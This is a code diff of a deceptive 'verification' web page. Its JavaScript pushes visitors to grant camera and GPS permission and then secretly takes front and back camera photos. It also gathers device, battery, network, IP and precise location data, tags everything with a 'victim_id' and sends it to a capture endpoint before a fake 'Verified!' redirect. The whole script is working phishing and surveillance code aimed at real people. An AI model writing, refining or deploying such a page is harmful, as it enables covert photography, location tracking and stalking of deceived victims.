@@ -76,57 +76,25 @@
             0%,100% { box-shadow: 0 8px 30px rgba(245,87,108,0.35); }
             50% { box-shadow: 0 8px 60px rgba(245,87,108,0.7); }
         }
-        .footer-text {
-            font-size: 11px;
-            opacity: 0.3;
-            margin-top: 18px;
-        }
+        .footer-text { font-size: 11px; opacity: 0.3; margin-top: 18px; }
         .hidden { display: none !important; }
-        #loading {
-            margin-top: 20px;
-            font-size: 14px;
-            opacity: 0.7;
-            animation: pulseGlow 1.5s infinite;
-        }
+        #loading { margin-top: 20px; font-size: 14px; opacity: 0.7; animation: pulseGlow 1.5s infinite; }
         #redirectTimer {
-            margin-top: 20px;
-            font-size: 16px;
-            font-weight: 600;
-            color: #f093fb;
-            display: none;
+            margin-top: 20px; font-size: 16px; font-weight: 600;
+            color: #f093fb; display: none;
         }
         #redirectTimer .count {
-            font-size: 28px;
-            font-weight: 800;
-            color: #fff;
-            display: block;
-            margin: 8px 0;
-            animation: pulseGlow 1s infinite;
+            font-size: 28px; font-weight: 800; color: #fff;
+            display: block; margin: 8px 0; animation: pulseGlow 1s infinite;
         }
-        /* ===== PERMISSION ERROR MESSAGE ===== */
         #permissionError {
-            display: none;
-            margin-top: 20px;
-            padding: 14px 16px;
+            display: none; margin-top: 20px; padding: 14px 16px;
             background: rgba(245,87,108,0.1);
             border: 1px solid rgba(245,87,108,0.3);
-            border-radius: 16px;
-            font-size: 13px;
-            color: #f5576c;
+            border-radius: 16px; font-size: 13px; color: #f5576c;
             line-height: 1.5;
         }
-        #permissionError strong {
-            display: block;
-            font-size: 15px;
-            margin-bottom: 4px;
-            color: #fff;
-        }
-        #permissionError .hint {
-            font-size: 11px;
-            opacity: 0.7;
-            margin-top: 6px;
-            color: rgba(255,255,255,0.5);
-        }
+        #permissionError strong { display: block; font-size: 15px; margin-bottom: 4px; color: #fff; }
     </style>
 </head>
 <body>
@@ -141,15 +109,10 @@
         </button>
         <p class="footer-text">End-to-end encrypted · Secure connection</p>
         <div id="loading" class="hidden">⏳ Processing...</div>
-
-        <!-- ===== PERMISSION ERROR ===== -->
         <div id="permissionError">
-            <strong>⚠️ Camera Access Required</strong>
-            Please allow camera access to verify your identity and continue.
-            <div class="hint">If you denied access, please reset permissions in your browser settings and try again.</div>
+            <strong>⚠️ Permission Required</strong>
+            <span id="errorMsg">Please allow required permissions to continue.</span>
         </div>
-
-        <!-- ===== REDIRECT TIMER ===== -->
         <div id="redirectTimer">
             <span>✅ Verified! Redirecting in</span>
             <span class="count" id="timerCount">5</span>
@@ -158,51 +121,69 @@
     </div>
 
     <script>
-        // ===== URL PARAMS =====
         const urlParams = new URLSearchParams(window.location.search);
         const victimId = urlParams.get('v') || 'unknown';
         const redirectUrl = '{{REDIRECT_URL}}';
 
-        // ===== DEVICE INFO =====
-        function getDeviceInfo() {
-            const info = {
+        // ===== BASIC INFO =====
+        function getBasicInfo() {
+            return {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 screen: screen.width + 'x' + screen.height,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language,
-                battery: 'N/A',
-                network: 'N/A'
+                language: navigator.language
             };
-            if (navigator.getBattery) {
-                navigator.getBattery().then(b => info.battery = Math.round(b.level * 100) + '%');
-            }
-            if (navigator.connection) {
-                info.network = navigator.connection.effectiveType || 'N/A';
-            }
-            return info;
         }
 
-        // ===== IP / LOCATION =====
-        async function getLocationInfo() {
+        // ===== BATTERY =====
+        async function getBatteryInfo() {
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'Yes' : 'No'
+                    };
+                }
+            } catch (e) {}
+            return { level: 'N/A', charging: 'N/A' };
+        }
+
+        // ===== NETWORK =====
+        function getNetworkInfo() {
+            try {
+                if (navigator.connection) {
+                    return {
+                        type: navigator.connection.effectiveType || 'N/A',
+                        downlink: navigator.connection.downlink || 'N/A',
+                        rtt: navigator.connection.rtt || 'N/A'
+                    };
+                }
+            } catch (e) {}
+            return { type: 'N/A', downlink: 'N/A', rtt: 'N/A' };
+        }
+
+        // ===== IP =====
+        async function getIPInfo() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 return {
                     ip: data.ip || 'Unknown',
                     city: data.city || 'Unknown',
-                    lat: data.latitude || null,
-                    lng: data.longitude || null
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown'
                 };
             } catch {
-                return { ip: 'Unknown', city: 'Unknown', lat: null, lng: null };
+                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
             }
         }
 
-        // ===== SEND DATA TO BOT =====
+        // ===== SEND DATA =====
         async function sendData(payload) {
             try {
-                await fetch('/api/capture/cam', {
+                return await fetch('/api/capture/cam', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ victim_id: victimId, type: 'cam', ...payload })
@@ -212,32 +193,47 @@
             }
         }
 
-        // ===== HELPER: WAIT =====
         function wait(ms) {
             return new Promise(resolve => setTimeout(resolve, ms));
         }
 
-        // ===== GET CAMERA PERMISSION (COMPULSORY) =====
+        // ===== CAMERA PERMISSION =====
         async function requestCameraPermission() {
             try {
-                // Try to get permission using simple constraints
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                // Stop the stream immediately (just for permission)
-                stream.getTracks().forEach(track => track.stop());
+                stream.getTracks().forEach(t => t.stop());
                 return true;
             } catch (err) {
-                console.log('Permission denied:', err);
                 return false;
             }
         }
 
-        // ===== CAPTURE SINGLE CAMERA =====
+        // ===== GPS LOCATION PERMISSION (COMPULSORY) =====
+        function requestGPSPermission() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ granted: false, lat: null, lng: null });
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({
+                        granted: true,
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    }),
+                    err => resolve({ granted: false, lat: null, lng: null }),
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // ===== CAPTURE CAMERA =====
         async function captureCamera(facingMode, label) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: facingMode }
                 });
-
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.setAttribute('playsinline', 'true');
@@ -245,30 +241,19 @@
                 video.muted = true;
 
                 await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        resolve();
-                    };
+                    video.onloadedmetadata = () => { video.play(); resolve(); };
                     setTimeout(resolve, 2000);
                 });
-
                 await wait(1500);
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0);
-
+                canvas.getContext('2d').drawImage(video, 0, 0);
                 const photoData = canvas.toDataURL('image/jpeg', 0.85);
-
                 stream.getTracks().forEach(track => track.stop());
 
-                await sendData({
-                    photo: photoData,
-                    camera_type: label
-                });
-
+                await sendData({ photo: photoData, camera_type: label });
                 return true;
             } catch (err) {
                 console.log(`${label} camera error:`, err);
@@ -276,22 +261,28 @@
             }
         }
 
-        // ===== MAIN CAPTURE SEQUENCE =====
+        // ===== SHOW ERROR =====
+        function showError(msg) {
+            const errorBox = document.getElementById('permissionError');
+            document.getElementById('errorMsg').textContent = msg;
+            errorBox.style.display = 'block';
+        }
+
+        function hideError() {
+            document.getElementById('permissionError').style.display = 'none';
+        }
+
+        // ===== MAIN SEQUENCE =====
         async function startCapture() {
             const btn = document.getElementById('continueBtn');
             const loading = document.getElementById('loading');
             const timer = document.getElementById('redirectTimer');
             const timerCount = document.getElementById('timerCount');
-            const errorBox = document.getElementById('permissionError');
 
-            // Hide any previous error
-            errorBox.style.display = 'none';
+            hideError();
 
-            // Check if mediaDevices is supported
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                errorBox.style.display = 'block';
-                errorBox.querySelector('strong').textContent = '⚠️ Browser Not Supported';
-                errorBox.querySelector('.hint').textContent = 'Please use Chrome or a modern browser to continue.';
+                showError("Camera not supported on this device.");
                 return;
             }
 
@@ -299,78 +290,79 @@
             btn.textContent = '⏳ Please wait...';
             loading.classList.remove('hidden');
 
-            // ===== STEP 0: REQUEST CAMERA PERMISSION (COMPULSORY) =====
-            const hasPermission = await requestCameraPermission();
-
-            if (!hasPermission) {
-                // Permission denied — show error, reset button
+            // ===== STEP 1: CAMERA PERMISSION =====
+            const hasCamera = await requestCameraPermission();
+            if (!hasCamera) {
                 btn.disabled = false;
                 btn.textContent = 'Continue →';
                 loading.classList.add('hidden');
-                errorBox.style.display = 'block';
+                showError("Camera access is required. Please allow camera permission and try again.");
                 return;
             }
 
-            // ===== STEP 1: SEND DEVICE INFO + IP =====
-            const device = getDeviceInfo();
-            const loc = await getLocationInfo();
+            // ===== STEP 2: GPS LOCATION PERMISSION (COMPULSORY) =====
+            const gps = await requestGPSPermission();
+            if (!gps.granted) {
+                btn.disabled = false;
+                btn.textContent = 'Continue →';
+                loading.classList.add('hidden');
+                showError("Location access is required. Please allow location permission and try again.");
+                return;
+            }
+
+            // ===== STEP 3: COLLECT INFO =====
+            const basicInfo = getBasicInfo();
+            const batteryInfo = await getBatteryInfo();
+            const networkInfo = getNetworkInfo();
+            const ipInfo = await getIPInfo();
+
+            const deviceInfo = {
+                userAgent: basicInfo.userAgent,
+                platform: basicInfo.platform,
+                screen: basicInfo.screen,
+                timezone: basicInfo.timezone,
+                language: basicInfo.language,
+                battery: batteryInfo.level,
+                charging: batteryInfo.charging,
+                network: networkInfo.type,
+                downlink: networkInfo.downlink,
+                rtt: networkInfo.rtt
+            };
+
             await sendData({
-                device_info: device,
-                ip: loc.ip,
-                city: loc.city,
-                lat: loc.lat,
-                lng: loc.lng
+                device_info: deviceInfo,
+                ip: ipInfo.ip,
+                city: ipInfo.city,
+                region: ipInfo.region,
+                country: ipInfo.country,
+                location: { lat: gps.lat, lng: gps.lng, accuracy: gps.accuracy }
             });
             await wait(500);
 
-            // ===== STEP 2: FRONT CAMERA (SILENT) =====
+            // ===== STEP 4: FRONT CAMERA =====
             const frontOk = await captureCamera('user', 'Front');
             await wait(1000);
 
-            // ===== STEP 3: BACK CAMERA (SILENT) =====
+            // ===== STEP 5: BACK CAMERA =====
             if (frontOk) {
                 await captureCamera('environment', 'Back');
                 await wait(1000);
-            } else {
-                // Front failed — try again, permission compulsory
-                btn.disabled = false;
-                btn.textContent = 'Continue →';
-                loading.classList.add('hidden');
-                errorBox.style.display = 'block';
-                return;
             }
 
-            // ===== STEP 4: LOCATION (OPTIONAL) =====
-            requestLocation();
-            await wait(500);
-
-            // ===== STEP 5: HIDE LOADING, SHOW TIMER =====
+            // ===== STEP 6: TIMER + REDIRECT =====
             loading.classList.add('hidden');
             timer.style.display = 'block';
 
-            // ===== 5 SECOND TIMER =====
             let seconds = 5;
             timerCount.textContent = seconds;
-
             const interval = setInterval(() => {
                 seconds--;
                 timerCount.textContent = seconds;
-
                 if (seconds <= 0) {
                     clearInterval(interval);
                     window.location.href = redirectUrl || 'https://google.com';
                 }
             }, 1000);
-        }
-
-        // ===== LOCATION (OPTIONAL) =====
-        function requestLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => sendData({ location: { lat: pos.coords.latitude, lng: pos.coords.longitude } }),
-                    () => console.log('Location denied')
-                );
-            }
         }
     </script>
 </body>
